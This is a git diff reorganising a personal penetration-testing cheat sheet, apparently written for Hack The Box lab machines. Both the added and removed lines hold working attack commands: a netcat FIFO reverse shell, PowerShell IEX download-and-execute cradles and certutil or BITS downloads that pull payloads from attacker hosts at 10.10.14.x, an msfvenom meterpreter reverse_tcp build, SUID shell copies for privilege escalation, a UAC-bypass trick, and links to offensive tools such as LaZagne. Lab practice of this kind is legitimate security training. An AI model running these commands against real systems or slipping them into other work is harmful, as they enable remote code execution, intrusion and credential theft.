@@ -15,10 +15,37 @@ if ports appear wrapped with nmap add -n option
 ## Linux
 
 ## Windows
+#### Searching for string in files
+`grep -Ri password .`
+
+#### bypass UAC reading
+`net use Z: \\127.0.0.1\c$`
+
 
 # Usefull commands
 ## Windows
+### DOWNLOAD SHELL POWERSHELL
+```
+cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/rev1.ps1')  (may need to escape quotes)
+AVOID BAD CHARACTERS --> convert to windows file format
+iconv -t UTF-16LE | base64-w0 
+powershell 64 bit is stored in C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe
+start-process -Filepath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.73/adm.txt')" -credential $cred
+```
 
+### DOWNLOAD FILE CMD/PS
+```
+certutil -urlcache -split -f http://10.10.14.12/priv.exe C:\\users\\public\\agent.exe #CMD
+(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.12/priv.exe', 'C:/inetpub/wwwroot/1.exe') # PS
+Start-BitsTransfer -Source http://10.10.14.12/priv.exe -Destination 1.exe # PS
+$client = New-Object System.Net.WebClient  # two steps is better
+$client.DownloadFile('http://10.10.14.12/priv.exe', '1.exe')
+xcopy \\10.10.14.7\files\taskkill.exe  # from smb file server created with impacket
+wget -o enum.bat http://10.10.14.73/enum.bat
+
+# EXFIL FILES CMD/PS
+certutil -encode PATH DESTINATION
+```
 #### enumerate folders  in powershell
 ```gci -recurse . | select fullname```
 
@@ -27,6 +54,26 @@ if ports appear wrapped with nmap add -n option
 
 
 ## Linux
+
+```
+#fix shell
+echo $TERM
+stty -a
+^Z + stty raw -echo + fg + reset
+export SHELL=bash
+export TERM=xterm256-color
+stty rows 24 columns 80
+
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+tcpdump -i tun0 icmp
+python -m SimpleHTTPServer 80
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=51251 -f exe -o taskkil.exe
+impacket-smbserver files `pwd`
+rlwrap nc -lvnp 51251
+```
+
+
 
 # Web
 ```gobuster dir -u http://10.10.10.98 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt```
@@ -86,29 +133,8 @@ ENUMERATION
 
 JAWS --> https://github.com/411Hall/JAWS.git
 
-### DOWNLOAD SHELL POWERSHELL
-cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/rev1.ps1')  (may need to escape quotes)
-AVOID BAD CHARACTERS --> convert to windows file format
-iconv -t UTF-16LE | base64-w0 
-powershell 64 bit is stored in C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe
-start-process -Filepath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.73/adm.txt')" -credential $cred
-
-### DOWNLOAD FILE CMD/PS
-certutil -urlcache -split -f http://10.10.14.12/priv.exe C:\\users\\public\\agent.exe #CMD
-(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.12/priv.exe', 'C:/inetpub/wwwroot/1.exe') # PS
-Start-BitsTransfer -Source http://10.10.14.12/priv.exe -Destination 1.exe # PS
-$client = New-Object System.Net.WebClient  # two steps is better
-$client.DownloadFile('http://10.10.14.12/priv.exe', '1.exe')
-xcopy \\10.10.14.7\files\taskkill.exe  # from smb file server created with impacket
-wget -o enum.bat http://10.10.14.73/enum.bat
-
-EXFIL FILES CMD/PS
-certutil -encode PATH DESTINATION
 
 PRIVESC WINDOWS 
-#UAC
-#bypass UAC reading
-net use Z: \\127.0.0.1\c$
 
 
 whoami /priv
@@ -153,9 +179,9 @@ aclpwn -f svc-alfresco@htb.local -d htb.local --server 10.10.10.161 -du neo4j -d
 
 LINUX
 
-#PrivEsc
+
 # https://youtu.be/sW10TlZF62w?t=1610   NODE
-#if able to run command as other user
+# if able to run command as other user
 chmod u+s on dash shell after copying it.
 chown tom:admin /tmp/axano; chmod 6755 /tmp/axano # if group id is also needed
 execute with dash -p
@@ -164,27 +190,13 @@ https://gtfobins.github.io/
 
 find / -perm 4000 2> /dev/null
 sudo -l
-#Searching for string in files
-grep -Ri password .
 
-USEFULL COMMANDS
-#fix shell
-echo $TERM
-stty -a
-^Z + stty raw -echo + fg + reset
-export SHELL=bash
-export TERM=xterm256-color
-stty rows 24 columns 80
 
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
-tcpdump -i tun0 icmp
-python -m SimpleHTTPServer 80
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=51251 -f exe -o taskkil.exe
-impacket-smbserver files `pwd`
-rlwrap nc -lvnp 51251
 
-USEFULL FRAMEWORKS
-GIT
+
+# USEFULL FRAMEWORKS
+## GIT
+```
 nishang --> https://github.com/samratashok/nishang.git
 JAWS  --> enumeration https://github.com/411Hall/JAWS.git
 impacket --> https://github.com/SecureAuthCorp/impacket.git
@@ -198,8 +210,8 @@ linenum --> https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
 peas --> https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
 aclpwn --> https://github.com/fox-it/aclpwn.py
 lazagne --> https://github.com/AlessandroZ/LaZagne
-
-APT
+```
+## APT
 gobuster
 mdbtools
 seclists
@@ -207,7 +219,7 @@ shellter + dpkg --add-architecture i386 && apt-get update && apt-get install win
 gem install evil-winrm
 pip install bloodhound
 
-VARIOUS
-#Decrypt LUKS
+# VARIOUS
+## Decrypt LUKS
 https://www.youtube.com/watch?v=krC5j1Ab44I
 https://book.hacktricks.xyz
